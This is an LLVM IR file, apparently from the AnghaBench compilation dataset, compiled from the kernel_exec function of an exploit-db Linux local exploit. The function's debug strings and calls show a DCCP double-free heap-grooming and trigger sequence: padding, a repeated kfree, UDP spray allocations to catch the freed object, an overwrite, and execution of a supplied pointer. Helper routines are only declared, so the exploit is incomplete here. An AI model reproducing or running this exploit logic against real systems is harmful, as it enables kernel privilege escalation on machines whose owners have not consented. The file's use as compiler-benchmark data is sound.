; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41458.c_kernel_exec.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_41458.c_kernel_exec.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dccp_handle = type { i32 }
%struct.udp_fifo_handle = type { i32 }

@.str = private unnamed_addr constant [18 x i8] c"[.] executing %p\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"kmalloc pad\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"kmalloc warm\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"dccp init\00", align 1
@port = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [19 x i8] c"dccp kmalloc kfree\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"catch 1\00", align 1
@CATCH_FIRST = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [18 x i8] c"dccp kfree again:\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"catch 2\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"catch 1 -> overwrite\00", align 1
@.str.9 = private unnamed_addr constant [26 x i8] c"catch 2 -> free & trigger\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"catch 1 & 2\00", align 1
@CATCH_AGAIN = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [10 x i8] c"[.] done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @kernel_exec(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca %struct.dccp_handle, align 4
  %5 = alloca %struct.udp_fifo_handle, align 4
  %6 = alloca %struct.udp_fifo_handle, align 4
  %7 = alloca %struct.udp_fifo_handle, align 4
  %8 = alloca [2048 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i8* %10)
  %12 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %13 = call i32 @memset(i8* %12, i32 0, i32 2048)
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @init_skb_buffer(i8* %14, i8* %15)
  %17 = call i32 @udp_fifo_init(%struct.udp_fifo_handle* %5)
  %18 = call i32 @udp_fifo_init(%struct.udp_fifo_handle* %6)
  %19 = call i32 @udp_fifo_init(%struct.udp_fifo_handle* %7)
  %20 = call i32 @debug(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  %21 = call i32 (...) @kmalloc_pad()
  %22 = call i32 @debug(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 (...) @kmalloc_warm()
  %24 = call i32 @debug(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %25 = load i32, i32* @port, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* @port, align 4
  %27 = call i32 @dccp_init(%struct.dccp_handle* %4, i32 %25)
  %28 = call i32 @debug(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %29 = call i32 @dccp_kmalloc_kfree(%struct.dccp_handle* %4)
  %30 = call i32 @debug(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %31

31:                                               ; preds = %38, %1
  %32 = load i32, i32* %3, align 4
  %33 = load i32, i32* @CATCH_FIRST, align 4
  %34 = icmp slt i32 %32, %33
  br i1 %34, label %35, label %41

35:                                               ; preds = %31
  %36 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %37 = call i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle* %5, i8* %36)
  br label %38

38:                                               ; preds = %35
  %39 = load i32, i32* %3, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %3, align 4
  br label %31

41:                                               ; preds = %31
  %42 = call i32 @debug(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0))
  %43 = call i32 @dccp_kfree_again(%struct.dccp_handle* %4)
  %44 = call i32 @debug(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %45

45:                                               ; preds = %52, %41
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* @CATCH_FIRST, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %55

49:                                               ; preds = %45
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %51 = call i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle* %6, i8* %50)
  br label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %3, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %3, align 4
  br label %45

55:                                               ; preds = %45
  %56 = call i32 @debug(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %57

57:                                               ; preds = %67, %55
  %58 = load i32, i32* %3, align 4
  %59 = load i32, i32* @CATCH_FIRST, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %70

61:                                               ; preds = %57
  %62 = call i32 @udp_fifo_kfree(%struct.udp_fifo_handle* %5)
  %63 = load i32, i32* @port, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* @port, align 4
  %65 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %66 = call i32 @sendmmsg_kmalloc_kfree(i32 %63, i8* %65)
  br label %67

67:                                               ; preds = %61
  %68 = load i32, i32* %3, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %3, align 4
  br label %57

70:                                               ; preds = %57
  %71 = call i32 @debug(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %72

72:                                               ; preds = %78, %70
  %73 = load i32, i32* %3, align 4
  %74 = load i32, i32* @CATCH_FIRST, align 4
  %75 = icmp slt i32 %73, %74
  br i1 %75, label %76, label %81

76:                                               ; preds = %72
  %77 = call i32 @udp_fifo_kfree(%struct.udp_fifo_handle* %6)
  br label %78

78:                                               ; preds = %76
  %79 = load i32, i32* %3, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %3, align 4
  br label %72

81:                                               ; preds = %72
  %82 = call i32 @debug(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %83

83:                                               ; preds = %90, %81
  %84 = load i32, i32* %3, align 4
  %85 = load i32, i32* @CATCH_AGAIN, align 4
  %86 = icmp slt i32 %84, %85
  br i1 %86, label %87, label %93

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %89 = call i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle* %7, i8* %88)
  br label %90

90:                                               ; preds = %87
  %91 = load i32, i32* %3, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %3, align 4
  br label %83

93:                                               ; preds = %83
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0))
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @init_skb_buffer(i8*, i8*) #1

declare dso_local i32 @udp_fifo_init(%struct.udp_fifo_handle*) #1

declare dso_local i32 @debug(i8*) #1

declare dso_local i32 @kmalloc_pad(...) #1

declare dso_local i32 @kmalloc_warm(...) #1

declare dso_local i32 @dccp_init(%struct.dccp_handle*, i32) #1

declare dso_local i32 @dccp_kmalloc_kfree(%struct.dccp_handle*) #1

declare dso_local i32 @udp_fifo_kmalloc(%struct.udp_fifo_handle*, i8*) #1

declare dso_local i32 @dccp_kfree_again(%struct.dccp_handle*) #1

declare dso_local i32 @udp_fifo_kfree(%struct.udp_fifo_handle*) #1

declare dso_local i32 @sendmmsg_kmalloc_kfree(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
